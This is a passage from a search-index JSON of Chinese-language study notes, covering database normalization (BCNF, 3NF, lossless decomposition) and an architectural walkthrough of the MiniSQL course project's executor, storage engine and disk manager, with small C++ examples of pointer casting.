<p>\u901a\u8fc7\u8fdb\u884c\u6709\u6548\u7684\u5206\u89e3\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u4e00\u822c\u7684\u5173\u7cfb\u6a21\u5f0fR\u8f6c\u6362\u6210\u7b26\u5408BCNF\u7684\u5173\u7cfb\u6a21\u5f0fR\uff0c\u5176\u5b9e\u57fa\u7840\u7684\u60f3\u6cd5\u5c31\u662f\u628a\u4e0d\u7b26\u5408BCNF\u7684\u4e1c\u897f\u62ff\u51fa\u6765\u5355\u72ec\u505a\u4e00\u4e2a\u96c6\u5408\uff0c\u5355\u72ec\u62bd\u51fa\u6765\u4e4b\u540e\u4ece\u4e3b\u8868\u4e2d\u5220\u9664\u6389\u53f3\u8fb9\u90a3\u4e2a\u4e1c\u897f(\u4ece\u5173\u7cfb\u56fe\u7684\u672b\u7aef\u5f00\u59cb\u5206\u89e3)\uff0c\u627e\u5230r\u662fR\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u4e0d\u7b26\u5408BCNF\u5e76\u4e14\u6709\u591a\u4e8e2\u7684\u5143\u7d20</p> <ul> <li>\u627e\u5230\u4e00\u4e2a\u8fdd\u53cdBCNF\u7684FD \\(a \\rightarrow b\\)</li> <li>\u8ba1\u7b97 \\(a+\\)</li> <li>\u5b9a\u4e49 \\(R_{1} = a+, R_{2} = a\\ \\cup (r - a+)\\)</li> <li>\u5c06\\(r\\)\u4ece\\(R\\)\u4e2d\u79fb\u9664\uff0c\u5e76\u4e14\u5c06\\(R_{1}\\)\u548c\\(R_{2}\\)\u63d2\u5165\u5230R\u4e2d</li> <li>\u91cd\u65b0\u68c0\u67e5\\(R\\)\u7684\u6240\u6709\u7684 \\(F\\)</li> </ul> <p>\u505a\u9898\u662f\u4e0d\u8981\u5fd8\u8bb0\u4e86\uff0c\u4e0d\u5728\\(F\\)\u4e2d\u7684\u5143\u7d20\uff0c\u5176\u5fc5\u5b9a\u662fsuper key\u7684\u4e00\u90e8\u5206</p> <p>3NF (\u4e0d\u5927\u8003)</p> <p>\u5bf9\u4e8eBCNF\u653e\u5bbd\u4e86\u4e00\u4e9b\u6761\u4ef6\uff0c\u5176\u51c6\u5165\u6761\u4ef6\u591a\u4e86\u4e00\u6761\uff0c\u5bf9\u4e8e\\(a\\rightarrow b\\) </p> <ul> <li>\\(b\\subseteq a\\)</li> <li>a\u662fR\u7684\u4e00\u4e2asuper key\uff0c\u4e5f\u5373\\(a\\rightarrow R\\)</li> <li>\u6bcf\u4e00\u4e2a\\(b-a\\)\u4e2d\u7684\u5c5e\u6027A\u90fd\u5305\u542b\u5728\u4e00\u4e2aR\u7684\u5019\u9009\u4e3b\u952e\u4e2d</li> </ul> <p>3NF\u8981\u7528\u5230\u7a7a\u503c\uff0c\u6709\u5197\u4f59\uff0c\u4f46\u662f\u80fd\u505a\u5230\u4f9d\u8d56\u4fdd\u6301</p> <p>BCNF\u6ca1\u6709\u5197\u4f59\uff0c\u4f46\u662f\u505a\u4e0d\u5230\u4f9d\u8d56\u4fdd\u6301</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/DB%20design/#lossless-decomposition","title":"Lossless Decomposition","text":"<p>\u8ba9\u5206\u89e3\u540e\u7684\u7ed3\u679c\u505a\u81ea\u7136\u8fde\u63a5\uff0c\u53ef\u4ee5\u7b80\u5355\u5730\u6062\u590d\u5230\u539f\u6765\u7684\u7ed3\u679c\uff0c\u7ed3\u679c\u8981\u76f8\u7b49\uff1b\u6709\u635f\u5206\u89e3\u5c31\u662f\u4e0d\u80fd\u7528\u5206\u89e3\u540e\u7684\u51e0\u4e2a\u5173\u7cfb\u91cd\u5efa\u539f\u672c\u7684\u5173\u7cfb</p> <p>\u65e0\u635f\u5206\u89e3\u7684\u5224\u5b9a\u65b9\u5f0f\uff1a</p> <ul> <li>\u5173\u952e\u5728\u4e8e\u5206\u89e3\u540e\u7684\u51fd\u6570\u4f9d\u8d56\u5173\u7cfb\u80fd\u5426\u4fdd\u6301</li> <li>\u627e\u5230\u5206\u89e3\u540e\u7ed3\u679c\u7684\u4ea4\u96c6\uff0c\u67e5\u770b\u8be5\u4ea4\u96c6\u662f\u5426\u4e3a\u67d0\u4e2a\u4e3b\u952e -&gt; \u65e0\u635f</li> <li>\u518d\u628a\u5206\u89e3\u51fa\u6765\\(F_{1},F_{2}\\)\u7b49\u6c42\u5408\u96c6\uff1b\u67e5\u770b\u5176\u80fd\u5426\u63a8\u51fa\u539f\u6765\u7684\u672a\u5206\u89e3\u7684\\(F+\\) -&gt; \u4fdd\u6301\u51fd\u6570\u4f9d\u8d56</li> </ul> <p>\u200b\u200b</p> <p>\u4f9d\u8d56\u4fdd\u6301\u9996\u5148\u5f97\u662f\u65e0\u635f\u5206\u89e3</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/MiniSQL%20%E6%A6%82%E8%BF%B0/","title":"MiniSQL \u6982\u8ff0","text":"<p>MiniSQL</p> <ol> <li>\u8fd9\u662f\u4e00\u4efd\u5173\u4e8e\u4e86\u89e3MiniSQL\u8fd0\u884c\u673a\u5236\u7684\u6587\u6863\uff0c\u5173\u4e8e\u81ea\u5df1\u5728\u5b8c\u6210MiniSQL\u4f5c\u4e1a\u7684\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u81ea\u5df1\u65f6\u5e38\u53ea\u662f\u9762\u5411\u6d4b\u8bd5\u7f16\u7a0b\uff0c\u4e0d\u770b\u6d4b\u8bd5\u5c31\u65e0\u6cd5\u7406\u89e3\u8fd9\u4e2a\u6a21\u5757\u5177\u4f53\u7684\u884c\u4e3a\uff0c\u8fd9\u5b9e\u9645\u4e0a\u4e5f\u4e25\u91cd\u964d\u4f4e\u6211\u7684\u5f00\u53d1\u6548\u7387\uff0c\u56e0\u6b64\u89c9\u5f97\u9700\u8981\u5728\u6b64\u5b9e\u9a8c\u5b8c\u6210\u4e4b\u9645\uff0c\u5bf9\u4e8e\u5176\u6574\u4f53\u67b6\u6784\u505a\u4e00\u904d\u68b3\u7406\u3002</li> <li>\u672c\u7bc7\u6587\u7ae0\u4e0d\u6d89\u53ca\u4efb\u4f55MiniSQL\u5b9e\u9645\u9700\u8981\u5b8c\u6210\u7684\u4ee3\u7801\uff0c\u4ec5\u4ec5\u5e2e\u52a9\u52a0\u6df1\u7406\u89e3\u3002</li> <li>\u5728\u9605\u8bfb\u7684\u8fc7\u7a0b\u8bf7\u914d\u5408\u6e90\u4ee3\u7801\u9605\u8bfb\uff0c\u672c\u7bc7\u6587\u7ae0\u4f1a\u4ecemain.cpp\u5f00\u59cb\u62c6\u89e3\u6574\u4e2aminisql</li> </ol>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/MiniSQL%20%E6%A6%82%E8%BF%B0/#_1","title":"\u6587\u4ef6\u76ee\u5f55","text":"<pre><code>.\n\u251c\u2500\u2500 buffer\n\u251c\u2500\u2500 catalog\n\u251c\u2500\u2500 common\n\u251c\u2500\u2500 concurrency\n\u251c\u2500\u2500 executor\n\u251c\u2500\u2500 include\n\u2502   \u251c\u2500\u2500 buffer\n\u2502   \u251c\u2500\u2500 catalog\n\u2502   \u251c\u2500\u2500 common\n\u2502   \u251c\u2500\u2500 concurrency\n\u2502   \u251c\u2500\u2500 executor\n\u2502   \u2502   \u251c\u2500\u2500 executors\n\u2502   \u2502   \u2514\u2500\u2500 plans\n\u2502   \u251c\u2500\u2500 index\n\u2502   \u251c\u2500\u2500 page\n\u2502   \u251c\u2500\u2500 parser\n\u2502   \u251c\u2500\u2500 planner\n\u2502   \u2502   \u251c\u2500\u2500 expressions\n\u2502   \u2502   \u2514\u2500\u2500 statement\n\u2502   \u251c\u2500\u2500 record\n\u2502   \u251c\u2500\u2500 recovery\n\u2502   \u251c\u2500\u2500 storage\n\u2502   \u2514\u2500\u2500 utils\n\u251c\u2500\u2500 index\n\u251c\u2500\u2500 page\n\u251c\u2500\u2500 parser\n\u251c\u2500\u2500 planner\n\u251c\u2500\u2500 record\n\u2514\u2500\u2500 storage\n</code></pre> <p>\u4e0a\u8ff0\u662f\u6574\u4e2aminisql\u7684<code>src</code>\u200b\u6587\u4ef6\u5939\u7684\u7ed3\u6784\uff0c\u6211\u4eec\u6240\u6709\u8981\u7f16\u5199\u7684\u4ee3\u7801\u90fd\u5728\u5176\u4e2d\uff0c\u4e0e<code>src</code>\u200b\u5e73\u884c\u7684\u6709\u4e24\u4e2a\u76f8\u5173\u7684\u6587\u4ef6\u5939\uff0c\u5206\u522b\u662f<code>build</code>\u200b\u548c<code>test</code>\u200b\u4ed6\u4eec\u5206\u522b\u5b58\u50a8\u4e86\u7f16\u8bd1\u7684\u7ed3\u679c\u548c\u6d4b\u8bd5\u7a0b\u5e8f\uff0c\u5176\u4e2d\u5185\u90e8\u57fa\u672c\u4e0d\u9700\u8981\u6211\u4eec\u4fee\u6539\u3002</p> <p>\u6587\u4ef6\u76ee\u5f55\u8bf4\u660e\uff0c\u9009\u62e9\u4e00\u90e8\u5206\u505a\u51fa\u8bf4\u660e</p> <ul> <li>include\u6587\u4ef6\u5939\uff0c\u91cc\u9762\u5b58\u50a8\u4e86\u6240\u6709\u7684\u5934\u6587\u4ef6\uff0c\u53ef\u89c1\u5176\u4e2d\u5185\u90e8\u7684\u6587\u4ef6\u5939\u548c\u5916\u90e8\u6587\u4ef6\u5939\u57fa\u672c\u662f\u4e00\u4e00\u5bf9\u5e94\u5173\u7cfb\u3002</li> <li> <p>\u200b<code>common/</code>\u200b\u548c<code>include/common/</code>\u200b\u4e24\u4e2a\u6587\u4ef6\u5939\uff0c\u5185\u90e8\u5b58\u50a8\u4e86\u6574\u4e2aMinisql\u5b9e\u9a8c\u4e2d\u4f1a\u7528\u7684\u4e00\u4e9b\u5168\u5c40\u53d8\u91cf\uff0cenum\u548c\u5b8f\u5b9a\u4e49\uff0c\u4e5f\u6709\u4e00\u4e9b\u7b80\u5355\u7c7b\u7684\u5b9e\u73b0\uff0c\u4f8b\u5982</p> </li> <li> <p>RowId\u7c7b\u7684\u5b9e\u73b0</p> </li> <li>\u8bfb\u5199\u9501\u7684\u5b9e\u73b0 (\u5f88\u9057\u61be\u6211\u6682\u65f6\u8fd8\u4e0d\u592a\u61c2\u8fd9\u4e00\u5757\u7684\u5b9e\u73b0\u548c\u5e94\u7528)</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/MiniSQL%20%E6%A6%82%E8%BF%B0/#_2","title":"\u81ea\u9876\u5411\u4e0b\u7684\u89e3\u6790","text":"<p>\u7531\u4e8e\u662f\u5b8c\u6210\u4e86\u5b9e\u9a8c\u4e4b\u540e\u8fdb\u884c\u7684\u603b\u4f53\u89e3\u91ca\uff0c\u56e0\u6b64\u4f1a\u91c7\u53d6\u81ea\u9876\u5411\u4e0b\u7684\u65b9\u6cd5\uff0c\u9996\u5148\u6765\u770bmain.cpp\u91cc\u7684\u5185\u5bb9\u3002</p> <p>\u9996\u5148\u662f\u5b8c\u6210\u4e86\u5bf9\u8f93\u5165\u7684\u83b7\u53d6\uff0c\u7136\u540e\u521d\u59cb\u5316\u4e86\u6267\u884c\u5668\u548c\u4e00\u4e2a\u4e0e\u8bed\u6cd5\u6811\u6709\u5173\u7684\u5bf9\u8c61\uff0c\u7136\u540e\u5c31\u662f\u4e0d\u65ad\u5730\u8bfb\u5165\u548c\u6267\u884c\uff0c\u8fd9\u4e2a\u903b\u8f91\u5f88\u7b80\u5355\u3002</p> <p>\u7531\u4e8e\u5b9e\u9a8c\u4e0d\u9700\u8981\u6211\u4eec\u6df1\u5165\u4e86\u89e3\u8bed\u6cd5\u6811\u7684\u90e8\u5206\uff0c\u5173\u952e\u6211\u4eec\u6765\u770b\u6267\u884c\u5668\u7684\u521d\u59cb\u5316\u3002</p> <pre><code>ExecuteEngine engine;\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/MiniSQL%20%E6%A6%82%E8%BF%B0/#executeengine","title":"\u6267\u884c\u5668(ExecuteEngine)\u91cc\u9762\u6709\u4ec0\u4e48","text":"<p>\u200b<code>src/include/executor/execute_engine.h</code>\u200b \u6267\u884c\u5668\u5f53\u7136\u6709\u4e00\u5806\u7684\u65b9\u6cd5\uff0c\u4f46\u662f\u6211\u4eec\u4e3b\u8981\u6765\u770b\u6267\u884c\u5668\u5185\u90e8\u7684\u53d8\u91cf</p> <pre><code> private:\n std::unordered_map&lt;std::string, DBStorageEngine *&gt; dbs_; /** all opened databases */\n std::string current_db_;                                 /** current database */\n</code></pre> <p>\u5f88\u663e\u7136\uff0c\u5176\u5b58\u50a8\u4e86\u4e00\u5806database\u7684\u540d\u5b57\u548c\u5176\u5177\u4f53\u7684DBStorageEngine\uff0c\u5e76\u4e14\u7528std::unordered_map\u5b8c\u6210\u4e86\u4e8c\u8005\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u4f7f\u5f97\u6211\u4eec\u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u6570\u636e\u5e93\u6587\u4ef6\u95f4\u5207\u6362\u3002</p> <p>\u63a5\u7740\u6211\u4eec\u6765\u770b\u5185\u90e8\u7684\u51fd\u6570\uff0c\u6211\u4ec5\u4ec5\u662f\u622a\u53d6\u4e86\u4e00\u90e8\u5206\uff0c\u8fd9\u90e8\u5206\u6211\u4e5f\u8fd8\u6ca1\u5b8c\u6210\uff0c\u4f46\u662f\u5176\u76f4\u89c2\u7684\u611f\u53d7\u662f\uff0c\u6211\u4eec\u901a\u8fc7\u8bed\u6cd5\u6811\u5b8c\u6210\u4e86\u5bf9\u4e8eSQL\u547d\u4ee4\u7684\u89e3\u6790\u4e4b\u540e\uff0c\u8c03\u7528\u5177\u4f53\u7684DBStorageEngine\u6267\u884c\u76f8\u5173\u64cd\u4f5c</p> <pre><code>  dberr_t ExecuteShowTables(pSyntaxNode ast, ExecuteContext *context);\n\n  dberr_t ExecuteCreateTable(pSyntaxNode ast, ExecuteContext *context);\n\n  dberr_t ExecuteDropTable(pSyntaxNode ast, ExecuteContext *context);\n\n  dberr_t ExecuteShowIndexes(pSyntaxNode ast, ExecuteContext *context);\n\n  dberr_t ExecuteCreateIndex(pSyntaxNode ast, ExecuteContext *context);\n\n  dberr_t ExecuteDropIndex(pSyntaxNode ast, ExecuteContext *context);\n</code></pre> <p>\u4e8e\u662f\u6211\u4eec\u4e0b\u4e00\u6b65\u8f6c\u5411DBStorageEngine\u7684\u5b9e\u73b0</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/MiniSQL%20%E6%A6%82%E8%BF%B0/#dbstorageengine","title":"DBStorageEngine","text":"<p>\u200b<code>src/include/common/instance.h</code>\u200b</p> <p>\u5176\u7c7b\u5b9a\u4e49\u7684\u4ee3\u7801\u8f83\u77ed\uff0c\u5c31\u76f4\u63a5\u653e\u51fa\u6765\u4e86</p> <pre><code>class DBStorageEngine {\n public:\n  explicit DBStorageEngine(std::string db_name, bool init = true, uint32_t buffer_pool_size = DEFAULT_BUFFER_POOL_SIZE);\n\n  ~DBStorageEngine();\n\n  std::unique_ptr&lt;ExecuteContext&gt; MakeExecuteContext(Txn *txn);\n\n public:\n  DiskManager *disk_mgr_;\n  BufferPoolManager *bpm_;\n  CatalogManager *catalog_mgr_;\n  std::string db_file_name_;\n  bool init_;\n};\n</code></pre> <p>\u5148\u770b\u6210\u5458\uff0c\u5176\u5185\u5b58\u6709\u4e09\u4e2a\u590d\u6742\u7684\u7ec4\u4ef6\uff0cDiskManager, BufferPoolManager\u548cCatalogManager\u3002\u8fd9\u4e09\u8005\u5b9e\u9645\u4e0a\u7ec4\u6210\u4e86\u6211\u4eec\u7684\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\uff0c\u6211\u4eec\u540e\u9762\u6162\u6162\u89e3\u91ca\uff0c\u5269\u4e0b\u4e24\u4e2a\u53d8\u91cf\u662f\u597d\u7406\u89e3\u7684\uff0c\u4e00\u4e2a\u662fdb\u7684\u540d\u5b57\uff0c\u53e6\u4e00\u4e2a\u662f\u8be5db\u7684\u521d\u59cb\u5316\u7684\u72b6\u6001</p> <p>\u8be5\u7c7b\u7684\u6784\u9020\u51fd\u6570\u4e5f\u5df2\u7ecf\u7ed9\u51fa\uff0c\u5927\u5bb6\u53ef\u4ee5\u81ea\u884c\u53c2\u770b\uff0c\u5176\u6784\u9020\u51fd\u6570\u5b9e\u9645\u5b8c\u6210\u4e86\u4ee5\u4e0b\u6b65\u9aa4</p> <ul> <li>\u8c03\u7528\u4e09\u4e2a\u590d\u6742\u7ec4\u4ef6\u7684\u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316\u8fd9\u4e09\u4e2a\u6210\u5458\uff08DiskManager, BufferPoolManager\u548cCatalogManager\uff09</li> <li> <p>\u5982\u679c\u662f<code>init</code>\u200b\u7684\u8bdd\uff0c\u8fd8\u9700\u8981\u5b8c\u6210\u4ee5\u4e0b\u5de5\u4f5c</p> </li> <li> <p>\u200b<code>remove(db_file_name_)</code>\u200b  \u8be5\u51fd\u6570\u5176\u5b9e\u6bd4\u8f83\u7b80\u5355\uff0c\u662fC++\u4e2d\u7684\u4e00\u4e2a\u7528\u4e8e\u5220\u9664\u6587\u4ef6\u7684\u51fd\u6570\uff0c\u6211\u4eec\u77e5\u9053\uff0c\u6570\u636e\u5e93\u6587\u4ef6\u672c\u8eab\u8fd8\u662f\u4e00\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u91cc\u7684\u6587\u4ef6\uff0c\u53ea\u662f\u6211\u4eec\u53ef\u4ee5\u7528DBMS\u8fdb\u884c\u9ad8\u6548\u7684\u7ba1\u7406\u548c\u4f7f\u7528\uff0c\u56e0\u6b64\u5728\u65b0\u5efa\u4e00\u4e2adb\u8fc7\u7a0b\u4e2d\uff0c\u81ea\u7136\u9700\u8981\u5220\u9664\u4e4b\u524d\u9057\u7559\u4e0b\u6765\u7684\u6570\u636e\u5e93\u6587\u4ef6\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u7a0b\u5e8f\u5c1d\u8bd5\u4e00\u4e0b</p> <pre><code>#include&lt;cstdio&gt;\nint main(){\n    std::remove(\"./a/test.txt\");\n}\n</code></pre> <p>\u200b\u200b</p> </li> <li> <p>\u68c0\u9a8c\u51e0\u4e2a\u5b58\u50a8\u5143\u6570\u636e\u7684\u9875\u662f\u5426\u4e3aFree\uff0c\u8fd9\u90e8\u5206\u4e0e\u540e\u9762\u51e0\u4e2a\u90e8\u5206\u5173\u7cfb\u8f83\u5927\uff0c\u8fd9\u91cc\u5148\u6309\u8fc7\u4e0d\u63d0</p> </li> </ul> <p>\u8fd8\u6709\u4e00\u4e2a\u5c0f\u95ee\u9898\uff0c\u6211\u4eecminisql\u7ed9\u6211\u4eec\u521b\u5efa\u7684\u6570\u636e\u5e93\u6587\u4ef6\u90fd\u653e\u5728\u54ea\u91cc\u5462\uff0c\u7b54\u6848\u662f\u5728<code>build/databases</code>\u200b\u4e2d\uff0c\u5982\u56fe\u6240\u793a\uff0c\u5176\u4e2d\u5b58\u50a8\u4e86\u51e0\u4e2a\u6d4b\u8bd5\u4e2d\u751f\u6210\u8fd8\u6ca1\u5220\u9664\u7684\u6570\u636e\u5e93\u6587\u4ef6\u3002\u8981\u6e05\u695a\u8ba4\u8bc6\u5230DBMS(\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf)\u548cDB(\u6570\u636e\u5e93)\u7684\u533a\u522b\uff0cDBMS\u662f\u7a0b\u5e8f\uff0c\u7528\u6765\u7ba1\u7406DB\uff1bDB\u662f\u6587\u4ef6\uff0c\u7528\u6765\u5b9e\u9645\u5b58\u50a8\u6570\u636e\u3002minisql\u662fDBMS</p> <p>\u200b\u200b</p> <p>\u90a3\u4e48\u63a5\u4e0b\u6765\u5c31\u662f\u4ecb\u7ecd\u4e09\u4e2a\u7ec4\u4ef6\u7684part\u4e86</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/MiniSQL%20%E6%A6%82%E8%BF%B0/#diskmanager","title":"diskmanager","text":"<p>\u5b9e\u9645\u4e0a\uff0c\u78c1\u76d8\u7ba1\u7406\u5668\u9762\u5bf9\u7684\u662f\u4e00\u4e2a\u975e\u5e38\u76f4\u89c2\u6e05\u6670\u7684\u573a\u666f\uff0c\u6211\u4eec\u6709\u4e00\u4e2a\u78c1\u76d8\u6587\u4ef6\uff0c\u9700\u8981\u60f3\u4e00\u4e2a\u65b9\u6cd5\u6765\u7ec4\u7ec7\u5185\u90e8\u8fd9\u4e9b\u7a7a\u95f4\uff0cminisql\u91c7\u53d6\u7684\u65b9\u6cd5\uff08\u4e5f\u662f\u6700\u5e38\u89c4\u7684\u65b9\u6cd5\uff09\u662f\u5c06\u5176\u5207\u6210\u4e00\u4e2a\u4e2apage\u6765\u4f7f\u7528\uff0c\u4e00\u4e2apage\u5c31\u662f\u4e00\u4e2a\u56fa\u5b9a\u957f\u5ea6\u7684\u7a7a\u95f4\u3002\u5177\u4f53\u600e\u4e48\u4e2a\u5207\u6cd5\uff0c\u5b9e\u9a8c\u6307\u5bfc\u91cc\u9762\u5df2\u7ecf\u8bf4\u7684\u5f88\u6e05\u695a\u4e86\u3002</p> <p>\u6211\u4eec\u5728diskmanager\u4e2d\u6240\u9700\u8981\u505a\u7684\uff0c\u5c31\u662f\u7ef4\u62a4\u6bcf\u4e2apage\u7684\u4f7f\u7528\u72b6\u6001\uff0c\u5fc5\u8981\u7684\u65f6\u5019\u5c06\u5176\u5199\u5165\u78c1\u76d8\u548c\u8bfb\u51fa\u3002</p> <p>C++\u8981\u70b9</p> <p>\u4f46\u662f\u8fd9\u91cc\u6709\u4e00\u4e2a\u6bd4\u8f83\u5173\u952e\u7684C++\u7f16\u7a0b\u95ee\u9898\uff0c\u53ef\u80fd\u4f1a\u56f0\u6270\u6211\u4eec</p> <p>\u5728C/C++\u4e2d\uff0c\u6ca1\u6709\u7c7b\u578b\uff0c\u53ea\u6709bit\u6d41 bushi</p> <p>\u6211\u4eec\u53ef\u4ee5\u628a\u6307\u9488\u8ba4\u4e3a\u662f\u4e00\u4e2a\u89c6\u89d2\uff0c\u6765\u770b\u4e0b\u9762\u8fd9\u4e2a\u7a0b\u5e8f</p> <pre><code>class node{\nprivate:\n  int x;\n  int y;\npublic:\n  node(int x, int y):x(x),y(y){}\n    int getX(){return x;}\n};\nint main(){\n  node n1(1, 2);\n  int *n = (int*)(&amp;n1);\n  std::cout&lt;&lt; *n &lt;&lt;std::endl;\n  *n = 2;\n  std::cout&lt;&lt; n1.getX() &lt;&lt;std::endl;\n}\n</code></pre> <p>\u6211\u76f8\u4fe1\u5b66\u8fc7oop\u7684\u540c\u5b66\u5230\u7b2c11\u884c\u4e3a\u6b62\u90fd\u53ef\u4ee5\u660e\u767d\uff0c\u4f46\u662f\u7b2c11\u884c\u6211\u4eec\u5e72\u4e86\u4ec0\u4e48\uff0c\u6211\u4eec\u628a\u4e00\u4e2anode\u7c7b\u7684\u6307\u9488\u770b\u6210\u4e86int\u6307\u9488</p> <p>\u4e00\u4e2anode\u7c7b\u662f\u7531\u4e24\u4e2aint\u987a\u5e8f\u6392\u5217\u7ec4\u6210\u7684\uff0c\u6211\u4eec\u5c06\u5176\u770b\u505a\u4e00\u4e2aint\u6307\u9488\uff0c\u4e5f\u5c31\u662f\u5c06\u5176\u622a\u53d6\u4e86\u524d\u534a\u90e8\u5206\u3002</p> <p>\u8ba9\u6211\u4eec\u4ee501\u7684\u65b9\u5f0f\u518d\u770b\u770b\uff0c<code>n1</code>\u200b\u5c31\u662f</p> <pre><code>00000...01 00000...10\n</code></pre> <p>\u5c06\u5176\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u6210\u4e86int\u6307\u9488\uff0c\u90a3\u4e48\u5c31\u662f\u622a\u53d6\u4e86\u524d32\u4f4dbit\uff0c\u90a3\u4e48\u5f88\u663e\u7136 *n \u7ed3\u679c\u5c31\u662f 1\u3002</p> <p>\u5176\u5b9e\u8fd9\u4e2a\u65f6\u5019\u8fd8\u6709\u4e00\u4e2a\u6709\u8da3\u7684\u70b9\u5728\u4e8e\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539*n\uff0c\u53bb\u4fee\u6539n1\u4e2d<code>private</code>\u200b\u53d8\u91cf\uff0c\u56e0\u6b64C++\u7684\u5c01\u88c5\u6027\u662f\u53ef\u4ee5\u76f4\u63a5\u88ab\u6307\u9488\u51fb\u7a7f\u7684\uff0c\u4f46\u8fd9\u4e2a\u70b9\u4e0eminisql\u7684\u5b9e\u9a8c\u5173\u7cfb\u4e0d\u5927\uff0c\u4e00\u822c\u6765\u8bf4\u8fd9\u79cd\u505a\u6cd5\u4e5f\u662f\u76f8\u5f53\u7cdf\u7cd5\u7684\u3002</p> <p>\u8fd8\u6709\u4e00\u4e2a\u70b9\u5728\u4e8e\uff0c\u5728node\u8fd9\u4e2a\u7b80\u5355\u7684\u7531\u4e24\u4e2aint\u7ec4\u6210\u7684\u7c7b\u4e2d\uff0c\u4e24\u4e2aint\u5728\u673a\u5668\u4e2d\u662f\u7d27\u5bc6\u7684\u987a\u5e8f\u6392\u5217\u7684\uff0c\u4f46\u662f\u5728\u4e00\u4e2a\u590d\u6742\u7684\u7c7b\u4e2d\uff0c\u4e0d\u4e00\u5b9a\u662f\u6bcf\u4e2a\u53d8\u91cf\u90fd\u7d27\u5bc6\u7684\u987a\u5e8f\u6392\u5e03\uff0c\u8981\u8003\u8651\u673a\u5668\u7684\u5185\u5b58\u5bf9\u9f50\u89c4\u5219\uff0c\u611f\u5174\u8da3\u53ef\u4ee5\u53bb\u641c\u7d22\u4e00\u4e0b\u3002</p> <p>\u90a3\u4e48\u8bb2\u4e86\u8fd9\u4e48\u591a\uff0c\u8fd9\u4e0e\u6211\u4eecminisql\u6709\u4ec0\u4e48\u5173\u7cfb\u5462\uff0c\u6211\u4eec\u4f1a\u5728minisql\u7a0b\u5e8f\u4e2d\u770b\u5230\u5f88\u591a\u53eb\u505axxpage\u7684\u7c7b\uff0c\u5b83\u4eec\u5176\u5b9e\u90fd\u662fpage\u7684\u4e00\u79cd\u89c6\u89d2</p> <pre><code>template &lt;size_t PageSize&gt;\nclass BitmapPage {\n  ...\nprivate:\n  static constexpr size_t MAX_CHARS = PageSize - 2 * sizeof(uint32_t);\n\nprivate:\n  /** The space occupied by all members of the class should be equal to the PageSize */\n  [[maybe_unused]] uint32_t page_allocated_;\n  [[maybe_unused]] uint32_t next_free_page_;\n  [[maybe_unused]] unsigned char bytes[MAX_CHARS];\n};\n</code></pre> <p>\u4e0a\u8ff0\u662f\u6211\u4eec\u5728\u7b2c\u4e00\u6b21\u5b9e\u9a8c\u4e2d\u4f1a\u7528\u5230<code>bitmap page</code>\u200b \uff0c\u6211\u4eec\u524d\u6587\u4e2d\u63d0\u5230\u4e86page\u5c31\u662f\u4e00\u5757\u5b9a\u957f\u7684\u7a7a\u95f4\uff0c\u6211\u4eec\u505a <code>reinterpret_cast&lt;BitmapPage *&gt;(page)</code>\u200b \u4e5f\u5c31\u662f\u544a\u8bc9\u6211\u4eec\uff0c\u8fd9\u4e00\u5757\u5185\u5b58\u7684\u7a7a\u95f4\uff0c\u524d32bit\u662f\u4e00\u4e2a<code>uint32_t</code>\u200b\uff0c\u518d\u540e32bit\u4e5f\u662f\u4e00\u4e2a<code>uint32_t</code>\u200b\uff0c\u968f\u540eMAX_CHARS\u4e2abit\uff0c\u4f5c\u4e3a\u4e00\u4e2a<code>char\u6570\u7ec4</code>\u200b\uff0c\u4e5f\u5373\u6211\u4eec\u7684bitmap\u4f7f\u7528\u3002\u5176\u672c\u8d28\u6211\u4eec\u7528\u8fd9\u4e2a\u7c7b\u7684\u89c6\u89d2\u6765\u770b\u5f85\u8fd9\u4e2apage\u3002</p> <p>\u6211\u4eec\u6700\u7ec8\u90fd\u8981\u8bb2\u6570\u636e\u6309\u7167page\u5b58\u5165\u78c1\u76d8\uff0c\u90a3\u4e48\u5728\u4f7f\u7528\u7684\u65f6\u5019\u5982\u4f55\u5c06bit\u6d41\u53d8\u7684\u6709\u610f\u4e49\uff0c\u5c31\u9700\u8981\u4e0a\u8ff0\u7684\u505a\u6cd5\u3002</p> <p>\u638c\u63e1\u4e86\u8fd9\u4e00\u70b9\u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u638c\u63e1\u4e86\u5982\u4f55\u4f7f\u7528\u5728\u78c1\u76d8\u4e2d\u6570\u636e\uff0c\u914d\u5408\u5b9e\u9a8c\u6307\u5bfc\uff0cdiskmanager\u5c31\u5f88\u7b80\u5355\u4e86\uff0c\u4e3b\u8981\u5c31\u662fallocate\u548cdeallocate</p> <ul> <li>allocate 